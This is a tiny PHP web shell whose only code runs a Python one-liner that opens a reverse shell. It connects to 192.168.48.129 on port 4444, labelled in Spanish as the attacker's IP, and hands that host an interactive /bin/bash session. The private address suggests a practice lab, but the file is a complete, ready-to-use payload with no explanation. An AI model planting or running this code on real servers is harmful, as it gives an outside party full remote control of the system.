<?php
$ip = '192.168.48.129'; // TU IP ATACANTE
$port = 4444;
$shell = 'python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'.$ip.'\",'.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"';
exec($shell);
?>
